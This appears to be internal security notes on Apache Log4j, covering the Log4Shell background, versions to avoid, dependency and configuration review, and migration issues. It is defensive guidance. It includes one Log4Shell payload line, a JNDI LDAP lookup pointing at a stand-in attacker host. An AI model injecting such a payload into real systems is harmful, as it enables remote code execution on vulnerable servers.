Log4j Security Notes
Overview

Apache Log4j is one of the most widely used logging frameworks in the Java ecosystem.

In late 2021, multiple critical vulnerabilities collectively known as "Log4Shell" exposed the risks of unsafe message lookups and JNDI-based remote code execution. As a result, organizations should carefully review Log4j versions and configurations during dependency upgrades.

Affected Artifacts
Log4j 2
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
</dependency>
Log4j API
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
</dependency>
Recommended Versions

Use a currently supported Log4j 2 release.

Avoid:

Log4j 1.x
End-of-life Log4j 2 releases
Unpatched versions affected by Log4Shell vulnerabilities

Review organizational security policies for approved versions.

Log4Shell Background

The most significant vulnerability involved JNDI lookups embedded in log messages.

Example:

${jndi:ldap://attacker.example.com/exploit}

In vulnerable environments, processing such input could result in remote code execution.

Security Objectives

When reviewing Log4j deployments:

Eliminate vulnerable versions
Disable unsafe lookup functionality
Remove obsolete dependencies
Verify runtime configuration
Validate third-party transitive dependencies
Log4j 1.x Migration

Log4j 1.x is end-of-life and should be replaced.

Common migration targets:

Log4j 2
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
</dependency>
SLF4J + Logback
<dependency>
    <groupId>ch.qos.logback</groupId>
    <artifactId>logback-classic</artifactId>
</dependency>
Dependency Review

Identify all Log4j-related dependencies.

Use:

mvn dependency:tree

Review:

Direct dependencies
Transitive dependencies
Shaded dependencies
Application server libraries
BOM Management

Prefer BOM-based version management.

Example:

<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-bom</artifactId>
            <version>${log4j.version}</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>

This helps maintain version consistency across Log4j modules.

Configuration Review

Review:

log4j2.xml
log4j2.yaml
log4j2.json
Programmatic configuration

Validate:

Appenders
Layouts
Filters
Async logging
JNDI Usage

Review any configuration using:

JNDI
LDAP
RMI
DNS

Avoid unnecessary remote lookup functionality.

If JNDI functionality is required, review security implications carefully.

Lookup Expressions

Review usage of:

${env:VAR}
${sys:property}
${ctx:key}
${date:pattern}

Ensure all lookup functionality aligns with current security requirements.

Asynchronous Logging

Applications using asynchronous logging should validate:

Throughput
Memory consumption
Queue behavior
Failure handling

after upgrades.

Third-Party Frameworks

Many frameworks bring Log4j transitively.

Review:

Spring applications
Batch processing systems
Messaging applications
Legacy application servers

Ensure vulnerable Log4j artifacts are not reintroduced through transitive dependencies.

Common Migration Issues
Multiple Logging Frameworks

Symptoms:

Duplicate log entries
Missing log entries
Startup warnings

Resolution:

Standardize logging implementation and remove unnecessary bridges.

Version Conflicts

Symptoms:

Class loading errors
NoSuchMethodError
NoClassDefFoundError

Resolution:

Align Log4j module versions and review dependency tree output.

Configuration Compatibility

Symptoms:

Missing appenders
Startup failures
Unexpected logging behavior

Resolution:

Review configuration files and validate against upgraded Log4j versions.

Security Validation

Verify:

No vulnerable Log4j versions remain
No unsupported Log4j 1.x dependencies remain
No unsafe JNDI functionality is enabled
Logging configuration follows organizational standards